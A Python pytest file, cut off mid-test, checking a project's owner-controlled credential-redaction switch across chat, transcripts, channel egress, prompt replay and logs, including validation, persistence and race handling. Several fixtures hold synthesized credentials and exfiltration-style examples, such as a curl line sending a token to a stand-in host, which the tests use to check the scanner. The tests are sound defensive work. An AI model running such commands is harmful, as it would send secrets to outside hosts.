"""The owner's ONE credential-redaction setting (``kiro_crew.redaction_seams``).

Every path the setting governs is exercised with it on and off; the record's default and
fail direction, its persistence across a gateway restart, the PUT's validation, the
refusal gates and the always-on rules are pinned beside them. Credential-shaped material
is synthesized at runtime, as in ``test_credential_redaction_switch.py``.
"""

from __future__ import annotations

import ast
import asyncio
import collections
import hashlib
import json
import logging
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock

import pytest
from redaction_structured_cases import github_classic

from kiro_crew import redaction_seams, security
from kiro_crew.log_redaction import SecretRedactionFilter
from kiro_crew.security import redaction_switch

_SRC = Path(__file__).resolve().parents[1] / "src" / "kiro_crew"


def _synth_labelled_secret() -> str:
    # A labelled AWS secret value: redacted by the credential plan on this branch.
    return "aws_secret_access_key = X" + hashlib.sha256(b"kc-seams").hexdigest()[:39]


def _synth_token_url() -> str:
    return "https://approve.example.test/auth?token=" + hashlib.sha256(b"kc-seams-t").hexdigest()


def _synth_bearer() -> str:
    return "Authorization: Bearer " + hashlib.sha256(b"kc-seams-b").hexdigest()


def _synth_exfil_url() -> str:
    blob = hashlib.sha256(b"kc-seams-x").hexdigest() * 4
    return f"https://collector.example.test/x?d={blob}"


def _synth_vault_value() -> str:
    return "vault-" + hashlib.sha256(b"kc-seams-v").hexdigest()[:24]


@pytest.fixture(autouse=True)
def _isolated(tmp_path, _floor_monkeypatch):
    """A tmp keystone, and the process verdict restored after every test.

    The record is the real one, so a test that reads it sees the shipped default.
    """
    store = tmp_path / "credential_redaction.json"
    _floor_monkeypatch.setattr(redaction_switch, "_path", lambda: store, raising=True)
    _floor_monkeypatch.setattr(redaction_seams, "_redaction_off", False)
    yield store


def _seams(off: bool, monkeypatch) -> None:
    """Publish the verdict a gateway would: redaction *off* (True) or on (False)."""
    monkeypatch.setattr(redaction_seams, "_redaction_off", off)


# ------------------------------------------------------------ the record and migration


class TestRecord:
    def test_a_fresh_home_reads_redaction_off(self):
        """The shipped default: one named constant, OFF."""
        assert redaction_switch.DEFAULT_REDACTION_ENABLED is False
        state = redaction_switch.read_state()
        assert state.enabled is False and state.changed_at == ""
        redaction_switch.publish_verdict(state)
        assert redaction_seams.published_off() is True

    def test_the_default_flips_in_the_one_constant(self, monkeypatch):
        monkeypatch.setattr(redaction_switch, "DEFAULT_REDACTION_ENABLED", True)
        state = redaction_switch.read_state()
        assert state.enabled is True
        redaction_switch.publish_verdict(state)
        assert redaction_seams.published_off() is False

    @pytest.mark.parametrize("raw", ["{}", '{"engine": "legacy"}'])
    def test_a_record_without_the_field_reads_the_default(self, _isolated, raw):
        _isolated.write_text(raw, encoding="utf-8")
        assert redaction_switch.read_state().enabled is redaction_switch.DEFAULT_REDACTION_ENABLED

    @pytest.mark.parametrize(
        "raw", ['{"enabled": "false"}', '{"enabled": 0}', '{"enabled": null}', "[]", "not json", ""]
    )
    def test_anything_but_a_boolean_reads_on(self, _isolated, raw):
        """A record that cannot positively say off or on reads redaction ON."""
        _isolated.write_text(raw, encoding="utf-8")
        assert redaction_switch.read_state().enabled is True

    def test_a_stored_choice_beats_the_default(self, _isolated):
        _isolated.write_text('{"enabled": true}', encoding="utf-8")
        assert redaction_switch.read_state().enabled is True
        _isolated.write_text('{"enabled": false}', encoding="utf-8")
        assert redaction_switch.read_state().enabled is False

    def test_a_field_the_record_once_carried_cannot_contradict_the_setting(self, _isolated):
        """``seams_enabled: false`` beside ``enabled: true``: the setting is the only vote."""
        _isolated.write_text('{"enabled": true, "seams_enabled": false}', encoding="utf-8")
        state = redaction_switch.read_state()
        assert state.enabled is True
        redaction_switch.publish_verdict(state)
        assert redaction_seams.published_off() is False
        secret = _synth_labelled_secret()
        with redaction_seams.output_seam(redaction_seams.ACP_PROMPT):
            assert security.redact_credentials(secret)[0] != secret

    def test_the_engine_selector_cannot_turn_redaction_off_or_back_on(self, _isolated):
        redaction_switch.set_engine(redaction_switch.ENGINE_LEGACY, changed_at="t0")
        assert redaction_switch.read_state().enabled is redaction_switch.DEFAULT_REDACTION_ENABLED
        redaction_switch.set_enabled(True, changed_at="t1")
        assert redaction_switch.read_state().engine == redaction_switch.ENGINE_LEGACY
        assert redaction_switch.read_state().enabled is True

    def test_a_write_keeps_only_the_known_fields(self, _isolated):
        _isolated.write_text('{"enabled": true, "seams_enabled": false}', encoding="utf-8")
        redaction_switch.set_enabled(False, changed_at="2026-11-02T00:00:00+00:00")
        assert json.loads(_isolated.read_text(encoding="utf-8")) == {
            "enabled": False,
            "changed_at": "2026-11-02T00:00:00+00:00",
            "engine": "structured",
            "engine_changed_at": "",
        }

    @pytest.mark.parametrize("stored", [False, True])
    def test_the_choice_survives_a_gateway_restart(self, _isolated, monkeypatch, stored):
        """A fresh process publishes nothing until boot reads the record: boot does."""
        from kiro_crew.dashboard.handlers import credential_redaction as handlers

        redaction_switch.set_enabled(stored, changed_at="2026-11-02T00:00:00+00:00")
        _seams(not stored, monkeypatch)  # the verdict a first run published
        monkeypatch.setattr(redaction_seams, "_redaction_off", False)  # a new process
        handlers.seed_pushed_switch()
        assert redaction_seams.published_off() is (not stored)

    def test_an_unknown_seam_name_is_refused(self):
        with pytest.raises(ValueError):
            with redaction_seams.output_seam("channel"):
                pass
        with pytest.raises(ValueError):
            redaction_seams.in_seam("channel")


# ------------------------------------------------------------------ the ACP prompt seam


class _Log:
    """Conversation-log stand-in for ``build_session_replay``."""

    def __init__(self, rows: list[dict]) -> None:
        self._rows = rows

    def read_messages_chained(self, session_key: str) -> list[dict]:
        return list(self._rows)

    def read_messages(self, session_key: str) -> list[dict]:
        return list(self._rows)


class TestAcpPromptSeam:
    def _replay(self, text: str) -> str:
        from kiro_crew.context import build_session_replay

        return str(build_session_replay(_Log([{"role": "user", "content": text}]), "k"))

    def test_on_the_replay_redacts_the_credential(self):
        secret = _synth_labelled_secret()
        assert secret not in self._replay(secret)

    def test_off_the_replay_keeps_the_credential(self, monkeypatch):
        _seams(True, monkeypatch)
        secret = _synth_labelled_secret()
        assert secret in self._replay(secret)

    @pytest.mark.parametrize("off", [False, True])
    def test_the_exfil_url_pass_runs_either_way(self, monkeypatch, off):
        _seams(off, monkeypatch)
        url = _synth_exfil_url()
        assert url not in self._replay(f"see {url} now")

    def test_every_prompt_replay_credential_pass_opens_the_seam(self):
        """The session-start history blocks: each ``redact_credentials`` call sits in
        ``output_seam(ACP_PROMPT)``, and the exfil pass beside it does not."""
        for rel in ("context.py", "context_assembly/session_start.py"):
            tree = ast.parse((_SRC / rel).read_text(encoding="utf-8"))
            inside, outside = _credential_calls(tree)
            assert inside, rel
            assert not outside, (rel, outside)


def _credential_calls(tree: ast.AST) -> tuple[list[int], list[int]]:
    """Lines of ``redact_credentials`` calls in ``build_session_replay`` and
    ``session_start`` history blocks, split by whether an ACP seam encloses them."""
    inside: list[int] = []
    outside: list[int] = []

    def seam_with(node: ast.AST) -> bool:
        if not isinstance(node, ast.With):
            return False
        for item in node.items:
            call = item.context_expr
            if (
                isinstance(call, ast.Call)
                and isinstance(call.func, ast.Attribute)
                and call.func.attr == "output_seam"
                and call.args
                and isinstance(call.args[0], ast.Attribute)
                and call.args[0].attr == "ACP_PROMPT"
            ):
                return True
        return False

    def walk(node: ast.AST, in_seam: bool, scope: str) -> None:
        for child in ast.iter_child_nodes(node):
            child_scope = scope
            if isinstance(child, (ast.FunctionDef, ast.AsyncFunctionDef)):
                child_scope = child.name
            if (
                isinstance(child, ast.Call)
                and isinstance(child.func, (ast.Name, ast.Attribute))
                and getattr(child.func, "attr", getattr(child.func, "id", ""))
                == "redact_credentials"
                and scope in ("build_session_replay", "build_session_context")
            ):
                (inside if in_seam else outside).append(child.lineno)
            walk(child, in_seam or seam_with(child), child_scope)

    walk(tree, False, "")
    return inside, outside


# -------------------------------------------------------------------------- the log seam


class TestLogSeam:
    def test_on_every_log_pass_runs(self):
        vault = _synth_vault_value()
        filt = SecretRedactionFilter([vault])
        out = filt.redact(f"{vault} {_synth_bearer()} {_synth_token_url()}")
        assert vault not in out
        assert _synth_bearer() not in out
        assert _synth_token_url() not in out

    def test_off_only_the_vault_secret_pass_runs(self, monkeypatch):
        _seams(True, monkeypatch)
        vault = _synth_vault_value()
        filt = SecretRedactionFilter([vault])
        out = filt.redact(f"{vault} {_synth_bearer()} {_synth_token_url()}")
        assert vault not in out and "[REDACTED]" in out
        assert _synth_bearer() in out
        assert _synth_token_url() in out

    def test_off_the_installed_record_factory_still_drops_vault_values(self, monkeypatch):
        """End to end through a real record: the factory's filter is the seam."""
        _seams(True, monkeypatch)
        vault = _synth_vault_value()
        filt = SecretRedactionFilter([vault])
        record = logging.LogRecord("t", logging.INFO, __file__, 1, "v=%s", (vault,), None)
        assert vault not in filt.redact(record.getMessage())

    def test_log_shim_on_redacts_the_credential(self):
        from kiro_crew.platform.context import redact_log_via_context

        secret = _synth_labelled_secret()
        assert secret not in redact_log_via_context(secret)

    def test_log_shim_is_not_a_seam_and_redacts_with_the_switch_off(self, monkeypatch):
        from kiro_crew.platform.context import redact_log_via_context

        _seams(True, monkeypatch)
        secret = _synth_labelled_secret()
        url = _synth_exfil_url()
        out = redact_log_via_context(f"{secret} {url}")
        assert secret not in out
        assert url not in out

    @pytest.mark.parametrize("clip", [-1, 0, 1, 20])
    def test_a_credential_cut_by_the_callers_clip_is_not_left_as_a_fragment(
        self, monkeypatch, clip
    ):
        """Callers write ``redact_log_via_context(text)[:N]``; redact first, clip after.

        With the switch off the helper must still redact before the clip, or the clip cuts
        the raw value and the stream's and the SEL's own passes see a fragment.
        """
        from kiro_crew.platform.context import redact_log_via_context

        _seams(True, monkeypatch)
        secret = _synth_labelled_secret()
        text = "x" * 30 + secret
        end = len(text) - len(secret) // 2 + clip
        clipped = redact_log_via_context(text)[:end]
        assert secret[len(secret) // 2 :] not in clipped
        assert secret[: len(secret) // 2] not in clipped


# ------------------------------------------------------------------ every other governed path


def _urls() -> dict[str, str]:
    """URLs a person meets every day, built at run time from fake pieces."""
    code = hashlib.sha256(b"kc-url-code").hexdigest()[:32]
    return {
        "oauth_authorize": (
            "https://auth.example.test/oauth2/authorize?client_id=abc123&response_type=code"
            "&scope=openid%20email&redirect_uri=https%3A%2F%2Fapp.example.test%2Fcb&state=xyz"
        ),
        "callback_code_state": f"https://app.example.test/cb?code={code}&state={code[:12]}",
        "fragment_access_token": f"https://app.example.test/cb#access_token={code}&token_type=bearer",
        "presigned_s3": (
            "https://bucket.s3.amazonaws.com/key?X-Amz-Algorithm=AWS4-HMAC-SHA256"
            "&X-Amz-Credential=AKIA" + "JXQ7P3LM5NTV2RWB/20260101/us-east-1/s3/aws4_request"
            "&X-Amz-Date=20260101T000000Z&X-Amz-Expires=900&X-Amz-SignedHeaders=host"
            "&X-Amz-Signature=" + hashlib.sha256(b"kc-url-sig").hexdigest()
        ),
        "slack_webhook": "https://hooks.slack.com/services/T0000000/B0000000/" + code[:24],
    }


def _github_token() -> str:
    return github_classic(seed=151)


class TestEveryGovernedPath:
    """Each path, with the setting off (the credential stays) and on (it goes)."""

    @pytest.mark.parametrize("off", [False, True])
    def test_chat_display_text(self, monkeypatch, off):
        from kiro_crew.dashboard import chat_utils_display

        _seams(off, monkeypatch)
        chat_utils_display._clear_display_redaction_cache()
        token = _github_token()
        assert (token in chat_utils_display._redact_for_display(f"key {token} end")) is off

    @pytest.mark.parametrize("off", [False, True])
    def test_the_chat_stream(self, monkeypatch, off):
        _seams(off, monkeypatch)
        token = _github_token()
        with redaction_seams.output_seam(redaction_seams.CHAT):
            redactor = security.StreamRedactor()
            out = redactor.feed(f"key {token} ") + redactor.feed("more ") + redactor.flush()
        assert (token in out) is off

    @pytest.mark.parametrize("off", [False, True])
    def test_the_saved_transcript(self, monkeypatch, off):
        from kiro_crew.dashboard.slot_persistence.message_entries import (
            _build_message_entry_uncached,
        )

        _seams(off, monkeypatch)
        token = _github_token()
        entry = _build_message_entry_uncached(
            {"role": "assistant", "content": f"key {token} end", "ts": "2026-11-14T00:00:00+00:00"}
        )
        assert entry is not None and (token in entry["content"]) is off

    def test_the_entry_cache_never_hands_an_off_entry_to_an_on_save(self, monkeypatch):
        """The cached entry is the post-redaction one, so the verdict is part of its key."""
        from kiro_crew.dashboard import chat_persistence

        token = _github_token()
        row = {
            "role": "assistant",
            "content": f"key {token} end",
            "ts": "2026-11-14T00:00:01+00:00",
        }
        _seams(True, monkeypatch)
        off_entry = chat_persistence._build_message_entry(dict(row))
        _seams(False, monkeypatch)
        on_entry = chat_persistence._build_message_entry(dict(row))
        assert off_entry is not None and token in off_entry["content"]
        assert on_entry is not None and token not in on_entry["content"]

    @pytest.mark.parametrize("off", [False, True])
    def test_channel_egress(self, monkeypatch, off):
        from kiro_crew.messaging.egress import channel_egress_parts
        from kiro_crew.messaging.transport import TransportCapabilities

        _seams(off, monkeypatch)
        token = _github_token()
        parts = asyncio.run(channel_egress_parts(f"key {token} end", TransportCapabilities()))
        assert (token in "".join(parts)) is off

    @pytest.mark.parametrize("off", [False, True])
    def test_the_acp_prompt(self, monkeypatch, off):
        from kiro_crew.context import build_session_replay

        _seams(off, monkeypatch)
        token = _github_token()
        replay = str(build_session_replay(_Log([{"role": "user", "content": token}]), "k"))
        assert (token in replay) is off

    @pytest.mark.parametrize("off", [False, True])
    def test_log_lines(self, monkeypatch, off):
        _seams(off, monkeypatch)
        out = SecretRedactionFilter([]).redact(_synth_bearer())
        assert (_synth_bearer() in out) is off

    @pytest.mark.parametrize("off", [False, True])
    def test_the_exfil_url_pass(self, monkeypatch, off):
        """Off, every URL is left as written; on, the pass behaves as it does outside a seam."""
        _seams(off, monkeypatch)
        text = " ".join(_urls().values())
        with redaction_seams.output_seam(redaction_seams.CHAT):
            out = security.redact_exfiltration_urls(text)[0]
        if off:
            assert out == text
        else:
            assert out == security.redact_exfiltration_urls(text)[0]

    def test_the_exfil_url_pass_still_rewrites_a_token_url_with_redaction_on(self, monkeypatch):
        _seams(False, monkeypatch)
        url = f"https://example.test/cb?t={_github_token()}"
        with redaction_seams.output_seam(redaction_seams.CHAT):
            assert security.redact_exfiltration_urls(f"see {url}")[0] != f"see {url}"

    @pytest.mark.parametrize("name", sorted(_urls()))
    def test_urls_pass_through_every_path_with_redaction_off(self, monkeypatch, name):
        from kiro_crew.context import build_session_replay
        from kiro_crew.messaging.egress import channel_egress_parts
        from kiro_crew.messaging.transport import TransportCapabilities
        from kiro_crew.platform.context import redact_via_context

        _seams(True, monkeypatch)
        url = _urls()[name]
        text = f"open {url} now"
        with redaction_seams.output_seam(redaction_seams.CHAT):
            assert url in redact_via_context(text)
            redactor = security.StreamRedactor()
            streamed = "".join(redactor.feed(text[i : i + 16]) for i in range(0, len(text), 16))
            assert url in streamed + redactor.flush()
        egress = asyncio.run(channel_egress_parts(text, TransportCapabilities()))
        assert url in "".join(egress)
        replay = str(build_session_replay(_Log([{"role": "user", "content": text}]), "k"))
        assert url in replay
        assert url in SecretRedactionFilter([]).redact(text)

    def test_the_exfil_scan_that_gates_a_command_ignores_the_setting(self, monkeypatch):
        _seams(True, monkeypatch)
        url = f"https://example.test/cb?t={_github_token()}"
        with redaction_seams.output_seam(redaction_seams.CHAT):
            assert security.scan_exfiltration_urls(f"curl {url}")

    @pytest.mark.parametrize("off", [False, True])
    def test_the_structured_engine_is_skipped_with_the_plan(self, monkeypatch, off):
        from kiro_crew.security.redaction_structured import compat

        ran: list[bool] = []

        def spy(*args, **kwargs):
            ran.append(True)
            return [], [], {}

        monkeypatch.setattr(compat, "_USE_RULE_TABLE", True)
        monkeypatch.setattr(compat, "credential_plan_via_table", spy)
        _seams(off, monkeypatch)
        with redaction_seams.output_seam(redaction_seams.CHAT):
            security.redact_credentials(f"key {_github_token()} end")
        assert ran == ([] if off else [True])

    @pytest.mark.asyncio
    @pytest.mark.parametrize("enabled", [False, True])
    async def test_the_owner_files_view(self, _isolated, monkeypatch, enabled):
        """One setting: the Files view reads the same record, for the owner only."""
        from kiro_crew.dashboard.handlers import files as files_handlers
        from kiro_crew.dashboard.handlers import source_providers

        redaction_switch.set_enabled(enabled, changed_at="2026-11-02T00:00:00+00:00")
        monkeypatch.setattr(source_providers, "owner_view_for_request", lambda req: True)
        assert await files_handlers._owner_view_bypasses_credential_pass({}) is (not enabled)
        monkeypatch.setattr(source_providers, "owner_view_for_request", lambda req: False)
        assert await files_handlers._owner_view_bypasses_credential_pass({}) is False


# --------------------------------------------------------------- what the off never reaches


class TestOutsideTheSeams:
    def test_a_refusal_gate_still_refuses_with_the_redaction_off(self, monkeypatch):
        """``redact(x) != x`` gates open no seam, so they keep scanning."""
        from kiro_crew.autonudge_service.store_loader import _addressing_value_unsafe_why

        _seams(True, monkeypatch)
        assert _addressing_value_unsafe_why(_synth_labelled_secret()) == "is credential-shaped"

    def test_plain_redaction_outside_a_seam_is_unchanged_with_the_redaction_off(self, monkeypatch):
        _seams(True, monkeypatch)
        secret = _synth_labelled_secret()
        assert security.redact(secret) != secret
        assert security.redact_credentials(secret)[0] != secret

    def test_a_request_blocking_gate_is_untouched(self, monkeypatch):
        _seams(True, monkeypatch)
        with redaction_seams.output_seam(redaction_seams.CHAT):
            assert security._contains_fixed_credential(_github_token()) is True

    def test_always_scan_overrides_a_seam(self, monkeypatch):
        _seams(True, monkeypatch)
        with redaction_seams.output_seam(redaction_seams.CHAT):
            assert redaction_switch.credential_pass_bypassed() is True
            with redaction_switch.always_scan():
                assert redaction_switch.credential_pass_bypassed() is False

    def test_a_task_that_opens_no_seam_keeps_redacting_beside_one_that_does(self, monkeypatch):
        _seams(True, monkeypatch)
        token = _github_token()

        async def in_seam() -> str:
            with redaction_seams.output_seam(redaction_seams.CHAT):
                await asyncio.sleep(0)
                return security.redact_credentials(token)[0]

        async def outside() -> str:
            await asyncio.sleep(0)
            return security.redact_credentials(token)[0]

        async def both() -> tuple[str, str]:
            return tuple(await asyncio.gather(in_seam(), outside()))  # type: ignore[return-value]

        seen, kept = asyncio.run(both())
        assert seen == token and kept != token


# ------------------------------------------------------------------------------ handlers


def _request(body=None):
    """A request shaped like a real DASHBOARD OWNER call (as test_credential_redaction_switch.py)."""
    req = MagicMock()
    req.path = "/api/security/credential-redaction"
    store = {"app": "", "user": "owner-1"}
    req.get = lambda key, default=None: store.get(key, default)
    req.__contains__ = lambda _self, key: key in store
    req.__getitem__ = lambda _self, key: store[key]
    state = MagicMock()
    state.owner_id = "owner-1"
    req.app = {"state": state}
    req.json = AsyncMock(return_value=body if body is not None else {})
    return req


@pytest.fixture
def _quiet_audit(monkeypatch):
    from kiro_crew.dashboard.handlers import credential_redaction as handlers

    calls: list[str] = []

    def fake(*, outcome, caller, detail="", critical=False, operation=None):
        calls.append(outcome)
        return True

    monkeypatch.setattr(handlers, "_audit", fake)
    return calls


class TestHandlers:
    @pytest.mark.asyncio
    async def test_put_off_writes_publishes_and_audits(self, _isolated, _quiet_audit):
        from kiro_crew.dashboard.handlers import credential_redaction as handlers

        req = _request(body={"enabled": False})
        resp = await handlers.api_credential_redaction_put(req)
        assert resp.status == 200
        payload = json.loads(resp.text)
        assert payload["enabled"] is False and payload["changed_at"]
        assert "seams_enabled" not in payload
        assert redaction_seams.published_off() is True
        assert "disabled" in _quiet_audit
        (msg_type, pushed), _ = req.app["state"].broadcast_ws_owners.call_args
        assert msg_type == "credential_redaction_changed" and pushed["enabled"] is False

        resp = await handlers.api_credential_redaction_put(_request(body={"enabled": True}))
        assert resp.status == 200
        assert redaction_seams.published_off() is False
        assert "enabled" in _quiet_audit

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "body",
        [
            {},
            [],
            "false",
            {"enabled": "false"},
            {"enabled": None},
            {"enabled": 0},
            {"enabled": False, "engine": "legacy"},
            {"enabled": False, "seams_enabled": False},
            {"seams_enabled": False},
            {"enabled": False, "extra": 1},
        ],
    )
    async def test_put_refuses_anything_but_one_boolean(self, _isolated, _quiet_audit, body):
        from kiro_crew.dashboard.handlers import credential_redaction as handlers

        resp = await handlers.api_credential_redaction_put(_request(body=body))
        assert resp.status == 400
        assert not _isolated.exists()
        assert redaction_seams.published_off() is False

    @pytest.mark.asyncio
    async def test_put_refuses_malformed_json(self, _isolated, _quiet_audit):
        from kiro_crew.dashboard.handlers import credential_redaction as handlers

        req = _request()
        req.json = AsyncMock(side_effect=ValueError("bad json"))
        resp = await handlers.api_credential_redaction_put(req)
        assert resp.status == 400
        assert json.loads(resp.text)["code"] == "invalid_json"
        assert not _isolated.exists()

    @pytest.mark.asyncio
    async def test_get_reports_the_default_off(self, _isolated, _quiet_audit):
        from kiro_crew.dashboard.handlers import credential_redaction as handlers

        resp = await handlers.api_credential_redaction_get(_request())
        assert json.loads(resp.text)["enabled"] is False

    def test_boot_seed_publishes_the_stored_setting(self, _isolated, monkeypatch):
        from kiro_crew.dashboard.handlers import credential_redaction as handlers

        redaction_switch.set_enabled(False, changed_at="2026-11-02T00:00:00+00:00")
        assert redaction_seams.published_off() is False
        handlers.seed_pushed_switch()
        assert redaction_seams.published_off() is True

    def test_a_policy_that_withdraws_the_opt_in_turns_redaction_back_on(
        self, _isolated, monkeypatch
    ):
        from kiro_crew.dashboard.handlers import credential_redaction as handlers

        monkeypatch.setattr(redaction_switch, "owner_may_disable", lambda: True)
        redaction_switch.set_enabled(False, changed_at="2026-11-02T00:00:00+00:00")
        handlers.seed_pushed_switch()
        assert redaction_seams.published_off() is True
        monkeypatch.setattr(redaction_switch, "owner_may_disable", lambda: False)
        loop = MagicMock()
        handlers.push_switch_moved_by_policy({"state": MagicMock()}, loop)
        assert redaction_seams.published_off() is False
        loop.call_soon_threadsafe.assert_called_once()

    @pytest.mark.parametrize("write", ["enabled", "engine"])
    def test_every_setter_returns_the_setting_in_force(self, _isolated, monkeypatch, write):
        monkeypatch.setattr(redaction_switch, "owner_may_disable", lambda: True)
        redaction_switch.set_enabled(False, changed_at="t0")
        monkeypatch.setattr(redaction_switch, "owner_may_disable", lambda: False)
        if write == "enabled":
            state = redaction_switch.set_enabled(False, changed_at="t1")
        else:
            state = redaction_switch.set_engine(redaction_switch.ENGINE_LEGACY, changed_at="t1")
        assert state == redaction_switch.read_state()
        assert state.enabled is True
        # The stored owner choice is kept: a later opt-in brings it back.
        assert json.loads(_isolated.read_text(encoding="utf-8"))["enabled"] is False

    def test_the_default_is_read_as_on_on_a_governed_host(self, _isolated, monkeypatch):
        """A fresh home on a host whose policy never opted in keeps redaction ON."""
        monkeypatch.setattr(redaction_switch, "owner_may_disable", lambda: False)
        assert not _isolated.exists()
        assert redaction_switch.read_state().enabled is True
        redaction_switch.publish_verdict(redaction_switch.read_state())
        assert redaction_seams.published_off() is False


class TestLiveLogStream:
    """The dashboard's live log stream reaches non-owner sockets, so it is not a seam."""

    @staticmethod
    def _record(msg: str) -> logging.LogRecord:
        return logging.LogRecord("kiro_crew.test", logging.INFO, __file__, 1, msg, None, None)

    def test_the_ring_and_live_frames_are_redacted_with_the_redaction_off(self, monkeypatch):
        from kiro_crew.dashboard.handlers import updates_streams

        _seams(True, monkeypatch)
        token = github_classic(seed=141)
        ring: collections.deque[str] = collections.deque(maxlen=5)
        handler = updates_streams._RingLogHandler(ring, 5)
        handler.emit(self._record(f"pushing with {token} and Authorization: Bearer {token}"))
        (entry,) = ring
        assert token not in entry

    def test_the_sse_queue_is_redacted_with_the_redaction_off(self, monkeypatch):
        from kiro_crew.dashboard.handlers import updates_streams

        _seams(True, monkeypatch)
        token = github_classic(seed=142)
        queue: asyncio.Queue[str] = asyncio.Queue()
        updates_streams._QueueLogHandler(queue).emit(self._record(f"clone {token}"))
        assert token not in queue.get_nowait()

    def test_a_record_built_inside_a_bypassed_seam_is_still_redacted(self, monkeypatch):
        from kiro_crew.dashboard.handlers import updates_streams

        _seams(True, monkeypatch)
        token = github_classic(seed=143)
        ring: collections.deque[str] = collections.deque(maxlen=5)
        handler = updates_streams._RingLogHandler(ring, 5)
        with redaction_seams.output_seam(redaction_seams.ACP_PROMPT):
            handler.emit(self._record(f"replay {token}"))
        assert token not in ring[0]

    def test_a_record_made_while_the_seams_were_off_is_redacted_after_they_come_back(
        self, monkeypatch
    ):
        """The setting at emit time says nothing of how a record was built, so the
        stream redacts every line: here the record was made with the seams off (its
        shape passes skipped) and reaches the handlers once they are back on."""
        from kiro_crew.dashboard.handlers import updates_streams

        _seams(True, monkeypatch)
        token = github_classic(seed=144)
        record = self._record(f"push with Authorization: Bearer {token}")
        _seams(False, monkeypatch)
        ring: collections.deque[str] = collections.deque(maxlen=5)
        updates_streams._RingLogHandler(ring, 5).emit(record)
        queue: asyncio.Queue[str] = asyncio.Queue()
        updates_streams._QueueLogHandler(queue).emit(record)
        assert token not in ring[0]
        assert token not in queue.get_nowait()

    def test_a_line_the_redactor_logs_while_redacting_does_not_recurse(self, monkeypatch):
        """The fail-closed path logs a warning; the stream redacting that warning must
        not run the redactor again (on Windows' smaller stack the recursion crashed the
        process). The outer line still reaches the ring, with the credential gone."""
        from kiro_crew.dashboard.handlers import updates_streams
        from kiro_crew.security.redaction_structured import compat

        def broken(*_a, **_kw):
            raise ValueError("detectors broke")

        monkeypatch.setattr(compat, "_USE_RULE_TABLE", True)
        monkeypatch.setattr(compat, "_read", broken)
        monkeypatch.setattr(compat, "_count_fail_closed", lambda: None)
        calls: list[int] = []
        real = security.redact

        def counting(text):
            calls.append(1)
            return real(text)

        monkeypatch.setattr(security, "redact", counting)
        token = github_classic(seed=145)
        ring: collections.deque[str] = collections.deque(maxlen=50)
        handler = updates_streams._RingLogHandler(ring, 50)
        crew_logger = logging.getLogger("kiro_crew")
        crew_logger.addHandler(handler)
        try:
            crew_logger.warning("push with %s", token)
        finally:
            crew_logger.removeHandler(handler)
        assert len(calls) <= 3, len(calls)
        assert ring, "the outer line was dropped"
        assert all(token not in entry for entry in ring)

    def test_a_failed_redaction_is_reported_once_with_the_stream_attached(self, monkeypatch):
        """The fail-closed warning reaches the stream, whose redaction of that line fails
        too; the one failure is still logged and counted once."""
        from kiro_crew.dashboard.handlers import updates_streams
        from kiro_crew.security.redaction_structured import compat

        def broken(*_a, **_kw):
            raise ValueError("detectors broke")

        counted: list[int] = []
        monkeypatch.setattr(compat, "_USE_RULE_TABLE", True)
        monkeypatch.setattr(compat, "_read", broken)
        monkeypatch.setattr(compat, "_count_fail_closed", lambda: counted.append(1))
        queue: asyncio.Queue[str] = asyncio.Queue()
        handler = updates_streams._QueueLogHandler(queue)
        crew_logger = logging.getLogger("kiro_crew")
        crew_logger.addHandler(handler)
        try:
            security.redaction.redact_credentials("token " + github_classic(seed=146))
        finally:
            crew_logger.removeHandler(handler)
        assert counted == [1]
        assert queue.qsize() == 1


class TestPublishUnderTheStoreLock:
    """A refresher's read and publish cannot interleave with an owner write."""

    @pytest.mark.parametrize("entry", ["seed", "policy"])
    def test_the_seams_verdict_is_read_and_published_under_the_lock(
        self, _isolated, monkeypatch, entry
    ):
        from kiro_crew.dashboard.handlers import credential_redaction as handlers

        held: list[bool] = []
        real = redaction_switch.publish_verdict

        def spy(state):
            held.append(redaction_switch._STORE_LOCK._is_owned())
            real(state)

        monkeypatch.setattr(redaction_switch, "publish_verdict", spy)
        if entry == "seed":
            handlers.seed_pushed_switch()
        else:
            handlers.push_switch_moved_by_policy({"state": MagicMock()}, MagicMock())
        assert held == [True]


class TestRefresherOwnerWriteRace:
    """An owner's ON landing while a refresh holds an older OFF read is the one published."""

    def test_an_owner_on_during_a_refresh_is_not_overwritten(self, _isolated, monkeypatch):
        import threading

        from kiro_crew.dashboard.handlers import credential_redaction as handlers

        monkeypatch.setattr(redaction_switch, "owner_may_disable", lambda: True)
        redaction_switch.set_enabled(False, changed_at="t0")
        handlers.seed_pushed_switch()
        assert redaction_seams.published_off() is True

        read_done, go = threading.Event(), threading.Event()
        real_read = redaction_switch.read_state

        def slow_read():
            state = real_read()
            read_done.set()
            go.wait(2.0)
            return state

        monkeypatch.setattr(redaction_switch, "read_state", slow_read)

        def owner_put_on():
            # The PUT handler's write-and-publish, under the store's transaction lock.
            with redaction_switch.transaction():
                state = redaction_switch.set_enabled(True, changed_at="t1")
                redaction_switch.publish_verdict(state)

        refresher = threading.Thread(
            target=handlers.push_switch_moved_by_policy, args=({"state": MagicMock()}, MagicMock())
        )
        refresher.start()
        assert read_done.wait(2.0)
        owner = threading.Thread(target=owner_put_on)
        owner.start()
        # With the lock the owner blocks here, so the window's length cannot fail the test.
        owner.join(0.3)  # flake-ok: bounded window for an unlocked write to land first
        go.set()
        refresher.join(2.0)
        owner.join(2.0)
        assert not refresher.is_alive() and not owner.is_alive()
        assert redaction_seams.published_off() is False


class TestAScopeNeverOutlivesTheSetting:
    """A turn opened while redaction was off stops bypassing once it is published on."""

    def test_a_seam_opened_while_off_redacts_after_the_setting_turns_on(self, monkeypatch):
        _seams(True, monkeypatch)
        token = _github_token()
        with redaction_seams.output_seam(redaction_seams.CHAT):
            assert security.redact_credentials(token)[0] == token
            redaction_seams.publish(False)
            assert security.redact_credentials(token)[0] != token

    def test_the_display_caches_follow_the_published_position(self, monkeypatch):
        from kiro_crew.dashboard import display_verdicts

        _seams(False, monkeypatch)
        on_mark, on_generation = (
            display_verdicts.engine_mark(),
            display_verdicts.engine_generation(),
        )
        redaction_seams.publish(True)
        assert display_verdicts.engine_mark() != on_mark
        assert display_verdicts.engine_generation() != on_generation

    def test_elicitation_values_are_judged_in_full_with_redaction_off(self, monkeypatch):
        from kiro_crew.dashboard.chat_runner import _redact_fields_for_display

        _seams(True, monkeypatch)
        token = _github_token()
        with redaction_seams.output_seam(redaction_seams.CHAT):
            _, tainted = _redact_fields_for_display([{"name": "x", "default": token}])
        assert tainted is True

    def test_the_log_shim_scans_in_full_inside_a_seam(self, monkeypatch):
